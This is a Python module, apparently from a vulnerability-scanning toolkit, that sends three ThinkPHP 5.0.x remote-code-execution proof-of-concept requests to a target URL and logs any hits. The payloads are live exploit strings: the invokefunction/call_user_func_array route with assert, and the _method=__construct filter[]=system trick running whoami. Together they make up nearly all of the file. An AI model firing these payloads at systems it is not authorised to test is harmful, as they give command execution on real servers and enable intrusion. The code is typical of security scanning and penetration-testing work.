#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from libs.public.outprint import OutPrintInfo
from libs.public.reqset import ReqSet

urllib3.disable_warnings()


class ThinkRCEScan5:

    def __init__(self):
        self.proxy = None
        self.timeout = None
        self.ssl = None
        self.headers = None

    def run13(self, urls):
        try:
            url = urls + '/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][0]=phpinfo();'
            # data = "_method=__construct&method=GET&filter[]=system&get[]=whoami"
            response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=self.timeout,
                                     proxies=self.proxy)
            response.encoding = response.apparent_encoding
            if "disable_functions" in response.text:
                OutPrintInfo("ThinkPHP", '[b bright_red]存在ThinkPHP-5.0.14-RCE-POC-2 ')
                OutPrintInfo("ThinkPHP", f"{url}\n")
            # OutPrintInfo("ThinkPHP", f"DATA:{data}")
                with open("./result/thinkphpRce5.txt", "a") as w:
                    w.write(f"存在ThinkPHP-5.0.14-RCE-POC-2 {url}\n")
            else:
                pass
                # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.14-RCE-POC-2')

        except Exception:
            pass
            # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.14-RCE-POC-2')
    def run14(self, urls):
        try:
            url = urls + '/?s=index/index'
            data = "s=whoami&_method=__construct&method=POST&filter[]=system"
            response = requests.post(url, headers=self.headers, verify=self.ssl, data=data,timeout=self.timeout,
                                     proxies=self.proxy)
            # response.encoding = response.apparent_encoding
            if response.status_code == 200 and url == response.url:
                OutPrintInfo("ThinkPHP", '[b bright_red]可能存在ThinkPHP-5.0.15-RCE-POC-1 ')
                OutPrintInfo("ThinkPHP", f"{url}")
                OutPrintInfo("ThinkPHP", f"DATA:{data}\n")
                with open("./result/thinkphpRce5.txt", "a") as w:
                    w.write(f"可能存在ThinkPHP-5.0.15-RCE-POC-1 {url} --- Data {data}\n")
            else:
                pass
                # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.15-RCE-POC-1')

        except Exception:
            pass
            # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.15-RCE-POC-1')
    def run15(self, urls):
        try:
            url = urls + '/?s=index/index'
            data = "aaaa=whoami&_method=__construct&method=GET&filter[]=system"
            response = requests.post(url, headers=self.headers, verify=self.ssl, data=data,timeout=self.timeout,
                                     proxies=self.proxy)
            # response.encoding = response.apparent_encoding
            if response.status_code == 200 and url == response.url:
                OutPrintInfo("ThinkPHP", '[b bright_red]可能存在ThinkPHP-5.0.15-RCE-POC-2 ')
                OutPrintInfo("ThinkPHP", f"{url}")
                OutPrintInfo("ThinkPHP", f"DATA:{data}\n")
                with open("./result/thinkphpRce5.txt", "a") as w:
                    w.write(f"可能存在ThinkPHP-5.0.15-RCE-POC-2 {url} --- Data {data}\n")
            else:
                pass
                # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.15-RCE-POC-2')

        except Exception:
            pass
            # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.15-RCE-POC-2')


    def main(self, target):
        # OutPrintInfo("ThinkPHP", '开始检测RCE...')
        url = target[0].strip('/ ')
        self.ssl = target[1]
        header = target[2]
        proxy = target[3]
        self.timeout = int(target[4])
        req = ReqSet(header=header)

        self.headers = req["header"]
        self.proxy = {"http": proxy, "https": proxy}

        self.run13(url)
        # OutPrintInfo("ThinkPHP", '开始POC-13...')
        self.run14(url)
        # OutPrintInfo("ThinkPHP", '开始POC-14...')
        self.run15(url)
